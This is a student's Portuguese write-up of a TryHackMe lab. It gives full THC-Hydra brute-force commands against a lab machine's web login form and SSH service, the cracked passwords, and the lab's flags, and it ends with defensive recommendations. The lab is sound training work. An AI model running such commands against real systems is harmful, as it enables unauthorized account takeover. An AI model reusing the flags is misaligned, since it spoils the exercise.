# Relatório de Prática: Pentest com THC-Hydra
**Plataforma:** TryHackMe 
**Tópico:** Cibersegurança 101 > Ferramentas de segurança 
**Responsável:** Fernanda Lobato 

---

## 1. Introdução
Este projeto apresenta a execução de ataques de força bruta (brute force) utilizando o **Hydra**, uma ferramenta de quebra de login paralela extremamente rápida. O objetivo foi explorar vulnerabilidades em serviços Web e SSH para obtenção de credenciais da usuária **Molly**

## 2. Metodologia e Ambiente
* **Máquina Alvo:** `10.66.152.25`
* **Máquina Atacante:** THM AttackBox (IP: `10.66.163.149`)
* **Wordlist utilizada:** `/usr/share/wordlists/rockyou.txt`
* **Ferramenta:** THC-Hydra v9.0

---

## 3. Execução dos Ataques

### A. Ataque Web (HTTP-POST-FORM)
O primeiro objetivo foi realizar um ataque de força bruta no formulário de login da aplicação web

**Comando utilizado:**
```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.66.152.25 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect."

``` 
**Resultado:**
* **Login encontrado:** `molly` 
* **Senha encontrada:** `sunshine` 
* **Flag 1:** `THM{2673a7dd116de68e85c48ec0b1f2612e}` 

---

### B. Ataque SSH
Após o sucesso na camada web, foi realizado um ataque ao serviço SSH para obter acesso remoto ao terminal do servidor

**Comando utilizado:**
```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.66.152.25 ssh -t 4
``` 
**Nota:** O parâmetro `-t 4` foi utilizado para limitar as tarefas paralelas a 4, evitando o bloqueio da conexão pelo servidor SSH, conforme recomendação do próprio terminal durante a execução

**# Resultado:**
* **Login encontrado:** `molly` 
* **Senha encontrada:** `butterfly` 
* **Flag 2:** `THM{C8EEB0468FEBBADEA859BAEB33B2541B}` 

---

## 4. Conclusão
A prática demonstrou a eficácia do Hydra em ataques de dicionário automatizados. Como medidas defensivas, recomenda-se o uso de senhas complexas, implementação de MFA (Autenticação de Múltiplos Fatores) e políticas de bloqueio após tentativas falhas (ex: fail2ban).
